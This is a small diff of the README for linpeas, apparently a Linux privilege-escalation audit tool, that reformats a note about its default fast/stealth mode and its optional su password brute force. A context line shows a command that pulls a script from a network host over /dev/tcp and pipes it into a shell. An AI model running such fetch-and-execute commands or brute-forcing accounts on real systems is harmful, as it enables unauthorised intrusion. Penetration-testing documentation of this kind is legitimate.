@@ -26,7 +26,9 @@ cat < /dev/tcp/10.10.10.10/80 | sh
 ```
 
 ## IMPORTANT CHANGE
-**For satisfying most users and thanks to the incorporation of the 2000pwds/user su bruteforce, the default behaviour of linpeas has been changed to fast/stealth (no writting to disk, no 1min processes check, and no su BF). Use the parameter -a to execute all these checks**
+**For satisfying most users and thanks to the incorporation of the 2000pwds/user su bruteforce, the default behaviour of linpeas has been changed to fast/stealth (no writting to disk, no 1min processes check, and no su BF).**
+
+**Use the parameter `-a` to execute all these checks.**
 
 ## Basic Information
 
